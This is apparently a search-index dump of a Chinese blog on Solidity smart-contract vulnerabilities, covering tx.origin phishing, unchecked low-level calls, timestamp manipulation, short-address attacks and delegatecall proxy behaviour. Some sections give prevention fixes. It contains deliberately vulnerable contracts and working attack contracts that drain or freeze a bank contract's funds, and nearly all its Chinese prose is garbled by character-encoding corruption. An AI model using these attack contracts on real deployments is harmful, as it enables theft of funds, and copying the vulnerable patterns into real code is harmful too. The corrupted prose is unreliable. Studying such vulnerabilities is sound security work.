åˆçº¦ä¸ä¼šå‡ºä¹æ„æ–™çš„è‡ªæ¯ã€‚ åˆçº¦ä¸ä¼šè¿›å…¥æ— é™å¾ªç¯ã€‚ require å’Œ assert çš„å‚æ•°è®¾å®šæ­£ç¡®ã€‚ é€€æ¬¾æ—¶ï¼Œè®©ç”¨æˆ·ä»åˆçº¦è‡ªè¡Œé¢†å–ï¼ˆpushï¼‰ï¼Œè€Œéæ‰¹é‡å‘é€ç»™ç”¨æˆ·(pull)ã€‚ ç¡®ä¿å›è°ƒå‡½æ•°ä¸ä¼šå½±å“æ­£å¸¸åˆçº¦è¿è¡Œã€‚ ç¡®ä¿å½“åˆçº¦çš„å‚ä¸è€…ï¼ˆä¾‹å¦‚ ownerï¼‰æ°¸è¿œç¼ºå¸­æ—¶ï¼Œåˆçº¦çš„ä¸»è¦ä¸šåŠ¡ä»èƒ½é¡ºåˆ©è¿è¡Œã€‚ 9. è²”è²…è¿™æ˜¯ä¸€ä¸ªä¼šè¢«å‰²éŸ­èœçš„æ¼æ´ å…·ä½“ä»‹ç» åœ¨è¿™é‡Œ 10. æŠ¢å…ˆäº¤æ˜“ é“¾ä¸ŠæŠ¢è·‘æŒ‡çš„æ˜¯æœç´¢è€…æˆ–çŸ¿å·¥é€šè¿‡è°ƒé«˜gasæˆ–å…¶ä»–æ–¹æ³•å°†è‡ªå·±çš„äº¤æ˜“å®‰æ’åœ¨å…¶ä»–äº¤æ˜“ä¹‹å‰ï¼Œæ¥æ”«å–ä»·å€¼ã€‚åœ¨åŒºå—é“¾ä¸­ï¼ŒçŸ¿å·¥å¯ä»¥é€šè¿‡æ‰“åŒ…ã€æ’é™¤æˆ–é‡æ–°æ’åºä»–ä»¬äº§ç”Ÿçš„åŒºå—ä¸­çš„äº¤æ˜“æ¥è·å¾—ä¸€å®šçš„åˆ©æ¶¦ï¼Œè€ŒMEVæ˜¯è¡¡é‡è¿™ç§åˆ©æ¶¦çš„æŒ‡æ ‡ã€‚ åœ¨ç”¨æˆ·çš„äº¤æ˜“è¢«çŸ¿å·¥æ‰“åŒ…è¿›ä»¥å¤ªåŠåŒºå—é“¾ä¹‹å‰ï¼Œå¤§éƒ¨åˆ†äº¤æ˜“ä¼šæ±‡é›†åˆ°Mempoolï¼ˆäº¤æ˜“å†…å­˜æ± ï¼‰ä¸­ï¼ŒçŸ¿å·¥åœ¨è¿™é‡Œå¯»æ‰¾è´¹ç”¨é«˜çš„äº¤æ˜“ä¼˜å…ˆæ‰“åŒ…å‡ºå—ï¼Œå®ç°åˆ©ç›Šæœ€å¤§åŒ–ã€‚é€šå¸¸æ¥è¯´ï¼Œgas priceè¶Šé«˜çš„äº¤æ˜“ï¼Œè¶Šå®¹æ˜“è¢«æ‰“åŒ…ã€‚åŒæ—¶ï¼Œä¸€äº›MEVæœºå™¨äººä¹Ÿä¼šæœç´¢mempoolä¸­æœ‰åˆ©å¯å›¾çš„äº¤æ˜“ã€‚æ¯”å¦‚ï¼Œä¸€ç¬”åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ä¸­æ»‘ç‚¹è®¾ç½®è¿‡é«˜çš„swapäº¤æ˜“å¯èƒ½ä¼šè¢«ä¸‰æ˜æ²»æ”»å‡»ï¼šé€šè¿‡è°ƒæ•´gasï¼Œå¥—åˆ©è€…ä¼šåœ¨è¿™ç¬”äº¤æ˜“ä¹‹å‰æ’ä¸€ä¸ªä¹°å•ï¼Œå†åœ¨ä¹‹åå‘é€ä¸€ä¸ªå–å•ï¼Œå¹¶ä»ä¸­ç›ˆåˆ©ã€‚è¿™ç­‰æ•ˆäºå“„æŠ¬å¸‚ä»·ã€‚ è¯¦ç»†å­¦ä¹  11. tx.originé’“é±¼æ”»å‡» ğŸ“Œ è¿™ä¸ªæ¼æ´æˆ‘æ„Ÿè§‰æœ‰ç‚¹ç‰µå¼ºå§ï¼Œä¸ºå“ˆå­tx.originè¦æ— ç¼˜æ— æ•…ä¹±è°ƒç”¨æœªçŸ¥çš„å‡½æ•°æï¼Œåæ­£å’±ç®¡ä¸ç€ï¼Œä¸‡ä¸€æï¼Œä¸‡ä¸€taå¥½å¥‡å¿ƒå¼ºå‘¢ã€‚ 11.1 å¤ç°Bank transfer(): è¯¥å‡½æ•°ä¼šè·å¾—ä¸¤ä¸ªå‚æ•°_toå’Œ_amountï¼Œå…ˆæ£€æŸ¥tx.origin == ownerï¼Œæ— è¯¯åå†ç»™_toè½¬è´¦_amountæ•°é‡çš„ETHã€‚æ³¨æ„ï¼šè¿™ä¸ªå‡½æ•°æœ‰è¢«é’“é±¼æ”»å‡»çš„é£é™©ï¼ 12345678910111213141516contract Bank &#123; address public owner;//è®°å½•åˆçº¦çš„æ‹¥æœ‰è€… //åœ¨åˆ›å»ºåˆçº¦æ—¶ç»™ owner å˜é‡èµ‹å€¼ constructor() payable &#123; owner = msg.sender; &#125; function transfer(address payable _to, uint _amount) public &#123; //æ£€æŸ¥æ¶ˆæ¯æ¥æº ï¼ï¼ï¼ å¯èƒ½ownerä¼šè¢«è¯±å¯¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæœ‰é’“é±¼é£é™©ï¼ require(tx.origin == owner, &quot;Not owner&quot;); //è½¬è´¦ETH (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); &#125;&#125; Hacker attack()ï¼šæ”»å‡»å‡½æ•°ï¼Œè¯¥å‡½æ•°éœ€è¦é“¶è¡Œåˆçº¦çš„owneråœ°å€è°ƒç”¨ï¼Œownerè°ƒç”¨æ”»å‡»åˆçº¦ï¼Œæ”»å‡»åˆçº¦å†è°ƒç”¨é“¶è¡Œåˆçº¦çš„transfer()å‡½æ•°ï¼Œç¡®è®¤tx.origin == owneråï¼Œå°†é“¶è¡Œåˆçº¦å†…çš„ä½™é¢å…¨éƒ¨è½¬ç§»åˆ°é»‘å®¢åœ°å€ä¸­ã€‚ 123456789101112131415161718contract Attack &#123; // å—ç›Šè€…åœ°å€ address payable public hacker; // Bankåˆçº¦åœ°å€ Bank bank; constructor(Bank _bank) &#123; //å¼ºåˆ¶å°†addressç±»å‹çš„_bankè½¬æ¢ä¸ºBankç±»å‹ bank = Bank(_bank); //å°†å—ç›Šè€…åœ°å€èµ‹å€¼ä¸ºéƒ¨ç½²è€…åœ°å€ hacker = payable(msg.sender); &#125; function attack() public &#123; //è¯±å¯¼bankåˆçº¦çš„ownerè°ƒç”¨ï¼Œäºæ˜¯bankåˆçº¦å†…çš„ä½™é¢å°±å…¨éƒ¨è½¬ç§»åˆ°é»‘å®¢åœ°å€ä¸­ bank.transfer(hacker, address(bank).balance); &#125;&#125; Remixæ¼”ç¤º å…ˆç»™Bankè½¬é’±ï¼Œè½¬ 5ETH åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè´¦æˆ·ï¼ˆhackerè´¦æˆ·ï¼‰ï¼Œéƒ¨ç½²æ”»å‡»åˆçº¦ è¿™é‡Œæœ€é‚£å•¥ï¼Œéœ€è¦åˆ‡æ¢å›Bankçš„éƒ¨ç½²è€…åœ°å€ï¼Œå°±ç®—æ˜¯ ***è¯±å¯¼***å§ï¼Œè°ƒç”¨attacktå‡½æ•° 11.2 é¢„é˜² ç›®å‰ä¸»è¦æœ‰ä¸¤ç§åŠæ³•æ¥é¢„é˜²å¯èƒ½çš„tx.originé’“é±¼æ”»å‡»ã€‚ 1 .ä½¿ç”¨msg.senderä»£æ›¿tx.origin msg.senderèƒ½å¤Ÿè·å–ç›´æ¥è°ƒç”¨å½“å‰åˆçº¦çš„è°ƒç”¨å‘é€è€…åœ°å€ï¼Œé€šè¿‡å¯¹msg.senderçš„æ£€éªŒï¼Œå°±å¯ä»¥é¿å…æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ä¸­æ··å…¥å¤–éƒ¨æ”»å‡»åˆçº¦å¯¹å½“å‰åˆçº¦çš„è°ƒç”¨ 123456function transfer(address payable _to, uint256 _amount) public &#123; require(msg.sender == owner, &quot;Not owner&quot;); (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;);&#125; 2. æ£€éªŒtx.origin == msg.sender å¦‚æœä¸€å®šè¦ä½¿ç”¨tx.originï¼Œé‚£ä¹ˆå¯ä»¥å†æ£€éªŒtx.originæ˜¯å¦ç­‰äºmsg.senderï¼Œè¿™æ ·ä¹Ÿå¯ä»¥é¿å…æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ä¸­æ··å…¥å¤–éƒ¨æ”»å‡»åˆçº¦å¯¹å½“å‰åˆçº¦çš„è°ƒç”¨ã€‚ä½†æ˜¯å‰¯ä½œç”¨æ˜¯å…¶ä»–åˆçº¦å°†ä¸èƒ½è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ 123456function transfer(address payable _to, uint _amount) public &#123; require(tx.origin == owner, &quot;Not owner&quot;); require(tx.origin == msg.sender, &quot;can&#x27;t call by external contract&quot;); (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;);&#125; å¥½å˜›ï¼Œåå­—èµ·çš„å¥½ï¼Œå«ä½œé’“é±¼~ 12. æœªæ£€æŸ¥çš„ä½çº§è°ƒç”¨ ğŸ“Œä»¥å¤ªåŠçš„ä½çº§è°ƒç”¨åŒ…æ‹¬ call()ï¼Œdelegatecall()ï¼Œstaticcall()ï¼Œå’Œsend()ã€‚è¿™äº›å‡½æ•°ä¸ Solidity å…¶ä»–å‡½æ•°ä¸åŒï¼Œå½“å‡ºç°å¼‚å¸¸æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šå‘ä¸Šå±‚ä¼ é€’ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´äº¤æ˜“å®Œå…¨å›æ»šï¼›å®ƒåªä¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ false ï¼Œä¼ é€’è°ƒç”¨å¤±è´¥çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œå¦‚æœæœªæ£€æŸ¥ä½çº§å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼ï¼Œåˆ™æ— è®ºä½çº§è°ƒç”¨å¤±è´¥ä¸å¦ï¼Œä¸Šå±‚å‡½æ•°çš„ä»£ç ä¼šç»§ç»­è¿è¡Œã€‚ æœ€å®¹æ˜“å‡ºé”™çš„æ˜¯send()ï¼šä¸€äº›åˆçº¦ä½¿ç”¨ send() å‘é€ ETHï¼Œä½†æ˜¯ send() é™åˆ¶ gas è¦ä½äº 2300ï¼Œå¦åˆ™ä¼šå¤±è´¥ã€‚å½“ç›®æ ‡åœ°å€çš„å›è°ƒå‡½æ•°æ¯”è¾ƒå¤æ‚æ—¶ï¼ŒèŠ±è´¹çš„ gas å°†é«˜äº 2300ï¼Œä»è€Œå¯¼è‡´ send() å¤±è´¥ã€‚å¦‚æœæ­¤æ—¶åœ¨ä¸Šå±‚å‡½æ•°æ²¡æœ‰æ£€æŸ¥è¿”å›å€¼çš„è¯ï¼Œäº¤æ˜“ç»§ç»­æ‰§è¡Œï¼Œå°±ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚ 12.1 å¤ç°ç¤ºä¾‹ UncheckedBank 1234567891011121314151617181920212223contract UncheckedBank &#123; mapping (address =&gt; uint256) public balanceOf; // ä½™é¢mapping // å­˜å…¥etherï¼Œå¹¶æ›´æ–°ä½™é¢ function deposit() external payable &#123; balanceOf[msg.sender] += msg.value; &#125; // æå–msg.senderçš„å…¨éƒ¨ether function withdraw() external &#123; // è·å–ä½™é¢ uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;Insufficient balance&quot;); balanceOf[msg.sender] = 0; // Unchecked low-level call bool success = payable(msg.sender).send(balance); &#125; // è·å–é“¶è¡Œåˆçº¦çš„ä½™é¢ function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; Hacker å®ƒåˆ»ç”»äº†ä¸€ä¸ªå€’éœ‰çš„å‚¨æˆ·ï¼Œå–æ¬¾å¤±è´¥ä½†æ˜¯é“¶è¡Œä½™é¢æ¸…é›¶ï¼šåˆçº¦å›è°ƒå‡½æ•° receive() ä¸­çš„ revert() å°†å›æ»šäº¤æ˜“ï¼Œå› æ­¤å®ƒæ— æ³•æ¥æ”¶ ETHï¼›ä½†æ˜¯ææ¬¾å‡½æ•° withdraw() å´èƒ½æ­£å¸¸è°ƒç”¨ï¼Œæ¸…ç©ºä½™é¢ã€‚ 12345678910111213141516171819202122232425262728contract Attack &#123; UncheckedBank public bank; // Bankåˆçº¦åœ°å€ // åˆå§‹åŒ–Bankåˆçº¦åœ°å€ constructor(UncheckedBank _bank) &#123; bank = _bank; &#125; // å›è°ƒå‡½æ•°ï¼Œè½¬è´¦ETHæ—¶ä¼šå¤±è´¥ receive() external payable &#123; revert(); &#125; // å­˜æ¬¾å‡½æ•°ï¼Œè°ƒç”¨æ—¶ msg.value è®¾ä¸ºå­˜æ¬¾æ•°é‡ function deposit() external payable &#123; bank.deposit&#123;value: msg.value&#125;(); &#125; // å–æ¬¾å‡½æ•°ï¼Œè™½ç„¶è°ƒç”¨æˆåŠŸï¼Œä½†å®é™…ä¸Šå–æ¬¾å¤±è´¥ function withdraw() external payable &#123; bank.withdraw(); &#125; // è·å–æœ¬åˆçº¦çš„ä½™é¢ function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; åˆ†æï¼šå› ä¸º UncheckedBank åˆçº¦ä¸­çš„ withdrawå‡½æ•°ï¼Œæœªå¯¹æ‰§è¡Œç»“æœè¿›è¡Œåˆ¤æ–­ï¼Œtaåªç®¡è½¬è´¦ï¼Œä¸ç®¡ç”¨æˆ·æ˜¯å¦å—åˆ°ï¼Œå¦‚æœç”¨æˆ·æ²¡æ”¶åˆ°ï¼Œtaç…§æ ·å°†ç”¨æˆ·çš„å­˜æ¬¾æ¸…ç©ºã€‚ 12.2 é¢„é˜² æ£€æŸ¥ä½çº§è°ƒç”¨çš„è¿”å›å€¼ï¼Œåœ¨ä¸Šé¢çš„é“¶è¡Œåˆçº¦ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹æ­£ withdraw()ã€‚ 12bool success = payable(msg.sender).send(balance);require(success, &quot;Failed Sending ETH!&quot;) åˆçº¦è½¬è´¦ETHæ—¶ï¼Œä½¿ç”¨ call()ï¼Œå¹¶åšå¥½é‡å…¥ä¿æŠ¤ã€‚ ä½¿ç”¨OpenZeppelinçš„Addressåº“ï¼Œå®ƒå°†æ£€æŸ¥è¿”å›å€¼çš„ä½çº§è°ƒç”¨å°è£…å¥½äº†ã€‚ 13. æ“çºµåŒºå—æ—¶é—´ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­ä½¿ç”¨block.timestampæ¥å‘åˆçº¦æä¾›å½“å‰åŒºå—çš„æ—¶é—´æˆ³ï¼Œå¹¶ä¸”è¿™ä¸ªå˜é‡é€šå¸¸è¢«ç”¨äºè®¡ç®—éšæœºæ•°ã€é”å®šèµ„é‡‘ç­‰ã€‚ä½†æ˜¯åŒºå—çš„æ‰“åŒ…æ—¶é—´å¹¶ä¸æ˜¯ç³»ç»Ÿè®¾å®šçš„ï¼Œè€Œæ˜¯å¯ä»¥ç”±çŸ¿å·¥åœ¨ä¸€å®šçš„å¹…åº¦å†…è¿›è¡Œè‡ªè¡Œè°ƒæ•´ã€‚å› æ­¤ï¼Œä¸€æ—¦æ—¶é—´æˆ³ä½¿ç”¨ä¸å½“ï¼Œåˆ™ä¼šå¼•èµ·æ¼æ´ã€‚ æ ¸å¿ƒé—®é¢˜ï¼šçŸ¿å·¥æ“çºµæ—¶é—´æˆ³ç”Ÿæˆå¯¹è‡ªå·±æœ‰åˆ©çš„éšæœºæ•°ï¼Œæˆ–è€…æ¥è§£é™¤åˆçº¦çš„æ—¶é—´é™åˆ¶ 13.1 å¤ç°ç¤ºä¾‹ä¸€ åˆçº¦é€šè¿‡äº¤æ˜“å‘é€æ‰€åœ¨åŒºå—æ—¶é—´æˆ³æ¥å†³å®šæ˜¯å¦è·å¥–ï¼Œæ¯ä¸ªåŒºå—ä¸­åªå…è®¸ç¬¬ä¸€ç¬”äº¤æ˜“è·å¥–ï¼Œè‹¥åŒºå—æ—¶é—´æˆ³çš„åè¿›åˆ¶è¡¨ç¤ºæœ€ä½ä½æ˜¯5ï¼Œäº¤æ˜“å‘é€è€…å³å¯è·å¥–ã€‚ 1234567891011121314pragma solidity ^0.4.24;contract TimeGame1&#123; uint public lastBlockTime; function lucky() public payable&#123; require(msg.value == 100 wei); require(lastBlockTime != block.timestamp); //block.timestampè·å–å½“å‰åŒºå—çš„æ—¶é—´æˆ³ lastBlockTime = block.timestamp; if(lastBlockTime % 10 == 5)&#123; msg.sender.transfer(address(this).balance); &#125; &#125;&#125; æ¼æ´ç‚¹ï¼šç”±äºçŸ¿å·¥æœ‰ä¸ª0~900sçš„ä»»æ„è®¾ç½®æ—¶é—´æˆ³çš„æƒé™ï¼Œå¯¼è‡´çŸ¿å·¥å¯ä»¥éå¸¸è½»æ˜“çš„æ¥è®¾ç½®æ»¡è¶³äº¤æ˜“çš„æ—¶é—´æˆ³ã€‚æ™®é€šç”¨æˆ·å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªæ”»å‡»åˆçº¦æ¥è°ƒç”¨lucky(),ä¹Ÿæ˜¯å¯ä»¥è‡ªç”±è®¾ç½®æ»¡è¶³äº¤æ˜“çš„æ—¶é—´æˆ³ã€‚ ç¤ºä¾‹äºŒ 14. çŸ­åœ°å€æ”»å‡»å¦‚æœæˆ‘ä»¬æƒ³è°ƒç”¨æ™ºèƒ½åˆçº¦çš„å‡½æ•°ï¼Œéœ€è¦åœ¨äº¤æ˜“çš„payloadå­—æ®µä¸­å¡«å……ä¸€æ®µå­—èŠ‚ç ã€‚ä»¥ERC20çš„transfer()çš„å‡½æ•°ä¸ºä¾‹ï¼Œå‡½æ•°åŸå‹ä¸ºï¼š function transfer(address to, uint amount) public returns (bool success); æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€æ®µ68ä¸ªå­—èŠ‚çš„å­—èŠ‚ç æ¥è°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œè½¬è´¦ï¼Œæ¯”å¦‚ï¼š a9059cbb000000000000000000000000146aed09cd9dea7a64de689c5d3ef73d2ee5ca000000000000000000000000000000000000000000000000000000000000000001 å…·ä½“å¯ä»¥åˆ†è§£ä¸º3ä¸ªéƒ¨åˆ†ï¼š 4å­—èŠ‚å‡½æ•°ç­¾åï¼ša9059cbb toå‚æ•°ï¼š000000000000000000000000146aed09cd9dea7a64de689c5d3ef73d2ee5ca00 amountå‚æ•°ï¼š0000000000000000000000000000000000000000000000000000000000000001å¤§å®¶å¯èƒ½æ³¨æ„åˆ°ï¼Œè¿™ä¸ªè½¬è´¦åœ°å€æœ‰ç‚¹ç‰¹æ®Šï¼šæœ€åä¸¤ä¸ªæ•°å­—ä¸º0ã€‚ å‡å¦‚æœ‰ä¸ªç”¨æˆ·â€œä¸å°å¿ƒâ€å¿˜è®°è¾“å…¥æœ€åè¿™ä¸¤ä¸ª0äº†æ€ä¹ˆåŠï¼Ÿè¿™æ ·æˆ‘ä»¬çš„è¾“å…¥å°±åªæœ‰67ä¸ªå­—èŠ‚äº†ã€‚EVMæ˜¯é€šè¿‡CALLDATALOADæŒ‡ä»¤ä»è¾“å…¥æ•°æ®ä¸­è·å–å‡½æ•°å‚æ•°çš„ï¼Œå› æ­¤å®ƒä¼šå…ˆä»åé¢çš„amountå‚æ•°é‡Œâ€œå€Ÿâ€ä¸¤ä¸ª0æ¥è¡¥è¶³å‰é¢çš„åœ°å€å‚æ•°ã€‚å½“å®ƒè¦åŠ è½½amountå‚æ•°çš„æ—¶å€™ï¼Œå‘ç°ä½æ•°ä¸å¤Ÿï¼Œä¼šåœ¨å³è¾¹è¡¥0è¿™ç¯‡*æ–‡ç« *å†™å¾—æŒºå¥½çš„ã€‚ å‚è€ƒé“¾æ¥WTFå­¦é™¢ æ…¢é›¾æ‹’ç»æœåŠ¡æ”»å‡»","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"åŸºç¡€æ¼æ´","slug":"åŸºç¡€æ¼æ´","permalink":"https://biyouqiuqiu.com/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"}]},{"title":"Wallet Mining","slug":"CTFS/damn defi/Wallet Mining","date":"2023-07-28T03:37:10.000Z","updated":"2023-07-28T03:37:10.000Z","comments":true,"path":"2023/07/28/CTFS/damn defi/Wallet Mining/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/28/CTFS/damn%20defi/Wallet%20Mining/","excerpt":"","text":"1. issue2. analysing3. solvinglink","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"å¤šé‡delegatecallå’Œcall","slug":"Basic_Knowledge/solidity/å¤šé‡delegatecallå’Œcall","date":"2023-07-26T01:47:15.000Z","updated":"2023-07-26T01:47:15.000Z","comments":true,"path":"2023/07/26/Basic_Knowledge/solidity/å¤šé‡delegatecallå’Œcall/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/26/Basic_Knowledge/solidity/%E5%A4%9A%E9%87%8Ddelegatecall%E5%92%8Ccall/","excerpt":"","text":"å‰è¨€ ğŸ“Œ åœ¨åš damn defiçš„ backdooræŒ‘æˆ˜æ—¶ï¼Œå…³äºå¦‚ä½•æ‰èƒ½è®© proxyåˆçº¦ç»™ hackeræ‰§è¡Œ approveæˆæƒæ“ä½œï¼Œå¼•å‘çš„æ·±æ€ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œdelegatecallæ˜¯å¾ˆç‰¹æ®Šçš„è°ƒç”¨æ–¹å¼ï¼Œå§”æ‰˜è°ƒç”¨ï¼Œä»£ç æ˜¯åœ¨é€»è¾‘åˆçº¦ Proxyä¸­æ‰§è¡Œã€‚ å¦‚æœæˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼æ‰§è¡Œ Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 å¯¹ Logic2æ¥è¯´ï¼Œå¦‚è‹¥å…¶å‡½æ•°ä½“å‘¢æœ‰ msg.senderå’Œ address(this)å˜é‡çš„è¯ï¼Œ æ˜“çŸ¥ï¼Œæ­¤æ—¶çš„ msg.sender = address(Caller)ï¼Œ address(this) = address(Proxy) ğŸ“Œ ä½†æ˜¯ï¼Œå¦‚æœåœ¨ delegatecallä¼ é€’é“¾ä¸Šå‡ºç°äº†callé‚£ä¹ˆå°±å¾ˆç¦»è°±äº†ã€‚ 1. å¤šé‡ä¼ é€’æŒ‰å¦‚ä¸‹ä¼ é€’é“¾è¿›è¡Œå‡½æ•°çš„è°ƒç”¨ã€‚ Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 --call--&gt; Logic3 å…³é”®çœ‹ Logic3çš„ msg.senderå’Œaddress(this)çš„å˜åŒ–ã€‚ 2. ä»£ç æ¼”ç¤ºä»£ç æ˜¯ä¸èƒ½æ­£å¸¸è¿è¡Œçš„ï¼Œä¸è¿‡ä¸é‡è¦ï¼Œæˆ‘åªè¦å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;hardhat/console.sol&quot;;/** Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 --call--&gt; Logic3 request: find Logic3&#x27;s msg.sender is or not address(proxy)*/contract Caller&#123; address public proxy; constructor(address proxy_)&#123; proxy = proxy_; &#125; function delegatecall_approve(address _logic2, address _logic3) external returns(bool , address) &#123; console.log(&quot;Caller_address= &quot;, address(this)); (bool success , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;funLogic1(address,address)&quot;, _logic2, _logic3)); return (success, abi.decode(data,(address))); &#125;&#125;contract Proxy &#123; address public implementation; constructor(address implementation_)&#123; implementation = implementation_; &#125; fallback() external payable &#123; _delegate(); &#125; function _delegate() public &#123; address _implementation; console.log(&quot;Proxy_address= &quot;, address(this)); assembly &#123; _implementation := sload(0) calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125;&#125;contract Logic1 &#123; address public implementation; function funLogic1(address _logic2, address _logic3) external &#123; console.log(&quot;Logic1_msg.sender= &quot;, msg.sender); console.log(&quot;Logic1_address= &quot;, address(this)); _logic2.delegatecall(abi.encodeWithSignature(&quot;funLogic2(address)&quot;,_logic3)); &#125;&#125;contract Logic2 &#123; address public implementation; function funLogic2(address _logic3) external &#123; console.log(&quot;Logic2_msg.sender= &quot;, msg.sender); console.log(&quot;Logic2_address= &quot;, address(this)); _logic3.call(abi.encodeWithSignature(&quot;funLogic3()&quot;)); &#125;&#125;contract Logic3 &#123; address public implementation; function funLogic3() external &#123; console.log(&quot;Logic3_msg.sender= &quot;, msg.sender); console.log(&quot;Logic3_address= &quot;, address(this)); &#125;&#125; 3. è¿è¡Œç»“æœ ğŸ“Œ ç”±ç»“æœä¸éš¾çœ‹å‡ºï¼Œå¯¹ Logic3æ¥è¯´ï¼Œta çš„è°ƒç”¨è€…å·²æˆä¸ºäº† Proxyåˆçº¦ï¼Œä¸”address(this)ä¹Ÿæ˜¯taæœ¬åˆçº¦çš„åœ°å€äº†ï¼Œæˆ‘ä¹‹å‰åšé¢˜çš„æ—¶å€™æƒ³ç ´è„‘è¢‹éƒ½ä¸çŸ¥é“æ€ä¹ˆåšåˆ°è®© ä»£ç†åˆçº¦ç»™ Hack åˆçº¦æˆæƒï¼Œå› ä¸ºæˆ‘æœ€å¼€å§‹è®¤ä¸ºï¼Œåœ¨ Logic2ä¸­æ‰§è¡Œ callï¼Œç›¸å¯¹äºLogic3æ¥è¯´ è°ƒç”¨è€…åº”è¯¥æ˜¯ Logic2æ‰å¯¹ï¼Œæƒ³äº†ä¸€å¤©å®åœ¨å—ä¸äº†äº†ï¼Œåªèƒ½å®è·µå‡ºçœŸçŸ¥äº†ã€‚mdã€‚ã€‚ã€‚ã€‚ç»“æœçœŸçš„æ˜¯å‡ºä¹æˆ‘çš„è®¤çŸ¥ã€‚","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"}]},{"title":"proxy_éšç¬”1","slug":"Basic_Knowledge/solidity/proxy_éšç¬”1","date":"2023-07-25T01:47:10.000Z","updated":"2023-07-25T01:47:10.000Z","comments":true,"path":"2023/07/25/Basic_Knowledge/solidity/proxy_éšç¬”1/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/25/Basic_Knowledge/solidity/proxy_%E9%9A%8F%E7%AC%941/","excerpt":"","text":"delegatecallå…³é”®å­—åœ¨ä»£ç†åˆçº¦ä¸­çš„å¦™ç”¨ å°±æ„Ÿè§‰å¾ˆå¾ˆç¥å¥‡~ é€»è¾‘åˆçº¦12345678910111213141516171819202122232425contract Logic &#123; address owner; uint public a = 8; constructor() &#123; owner = msg.sender; &#125; // 0x069265cd function increate() external &#123; require(owner == address(0), &quot;owner != address(0)&quot;); a++; &#125; function calSelector() external returns (bytes4 selector, bytes memory data) &#123; selector = Logic.increate.selector; data = abi.encodeWithSignature(&quot;getOwner()&quot;); &#125; // 0x893d20e8 function getOwner() external returns(address) &#123; a = 100; return owner; &#125;&#125; åœ¨ Logic ä¸­å¦‚æœä½ æƒ³è°ƒç”¨ increateå‡½æ•°ï¼Œæ˜¾ç¤ºæ˜¯ä¸å¯èƒ½çš„ï¼Œè¯¥æ–­è¨€é™åˆ¶äº†è¯¥åˆçº¦è‡ªå·±è°ƒç”¨è¯¥æ–¹æ³•ã€‚ä½†æ˜¯å¦‚æœé€šè¿‡ delegatecallæ¥è°ƒç”¨å°±ä¸ä¸€æ ·äº†ï¼Œä»£ç†åˆçº¦å¯ä»¥è‡ªå·±è®¾ç½®ä¸€ä¸ªåŒåçš„å˜é‡ï¼Œå¹¶ä»¤å…¶ç­‰äº address(0) ã€‚è¿™æ ·ä¸€æ¥é€»è¾‘åˆçº¦å°±å¯ä»¥è°ƒç”¨æ­¤å‡½æ•°äº†ã€‚ ä»£ç†åˆçº¦12345678910111213141516171819contract Proxy &#123; address public owner; uint public a; Logic logic; constructor(address _logic) &#123; logic = Logic(_logic); &#125; function delegatecall(bytes memory data) public returns (bool, bytes memory ) &#123; (bool success, bytes memory _data) = address(logic).delegatecall(data); return (success, _data); &#125; function increate() external &#123; a = 222; &#125;&#125; 